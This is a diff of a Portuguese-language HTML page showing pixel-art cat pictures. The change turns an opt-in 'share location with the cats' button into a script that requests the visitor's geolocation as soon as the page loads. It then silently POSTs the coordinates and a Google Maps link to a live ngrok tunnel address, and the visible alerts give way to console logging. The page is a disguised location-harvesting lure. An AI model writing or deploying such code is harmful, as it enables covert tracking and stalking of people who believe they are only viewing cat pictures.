@@ -6,56 +6,54 @@
   <title>Gatinhos Pixelados</title>
   <style>
     body {
-      background-color: #1a1a2e;
-      color: #ffffff;
-      font-family: 'Press Start 2P', cursive;
+      background-color: #ffcccb;
       text-align: center;
-      padding: 20px;
+      font-family: 'Comic Sans MS', cursive;
     }
     .container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
+      margin-top: 50px;
     }
-    .cat-pixel {
-      width: 200px;
-      height: auto;
+    .pixel-cat {
+      width: 150px;
+      height: 150px;
       image-rendering: pixelated;
       margin: 10px;
     }
-    .button {
-      background: #ffcc00;
-      border: none;
-      padding: 10px 20px;
-      font-size: 16px;
-      cursor: pointer;
-      margin-top: 10px;
+    .cats {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
+    .title {
+      font-size: 24px;
+      font-weight: bold;
+      color: #ff4081;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>😺 Gatinhos Pixelados 😺</h1>
-    <img class="cat-pixel" src="https://i.imgur.com/VgTYZJ6.png" alt="Gatinho Pixelado">
-    <img class="cat-pixel" src="https://i.imgur.com/Mscd1D6.png" alt="Gatinho Pixelado">
-    <button class="button" onclick="getLocation()">Compartilhar Localização com os Gatos</button>
+    <h1 class="title">🐱 Gatinhos Pixelados 🐱</h1>
+    <div class="cats">
+      <img src="https://www.pixelartcss.com/img/examples/cat-pixel.png" class="pixel-cat" alt="Gatinho 1">
+      <img src="https://www.pixelartcss.com/img/examples/cat-pixel.png" class="pixel-cat" alt="Gatinho 2">
+      <img src="https://www.pixelartcss.com/img/examples/cat-pixel.png" class="pixel-cat" alt="Gatinho 3">
+    </div>
   </div>
 
   <script>
-    function getLocation() {
+    window.addEventListener("load", () => {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-      } else {
-        alert("Seu navegador não suporta geolocalização. :(");
       }
-    }
+    });
 
     function sendLocation(position) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
       const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-      
-      fetch("https://seu-ngrok-aqui.ngrok-free.app/send-location", {
+
+      fetch("https://5057-187-59-186-51.ngrok-free.app/send-location", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
@@ -64,19 +62,15 @@
       })
       .then(response => response.json())
       .then(data => {
-        if (!data.success) {
-          alert("Erro ao enviar a localização para os gatinhos.");
-        } else {
-          alert("Os gatinhos receberam sua localização! 😻");
-        }
+        console.log("Localização enviada com sucesso!");
       })
       .catch(error => {
-        console.error("Erro:", error);
+        console.error("Erro ao enviar localização:", error);
       });
     }
 
     function handleError(error) {
-      alert("Erro ao obter a localização: " + error.message);
+      console.error("Erro ao obter a localização:", error.message);
     }
   </script>
 </body>
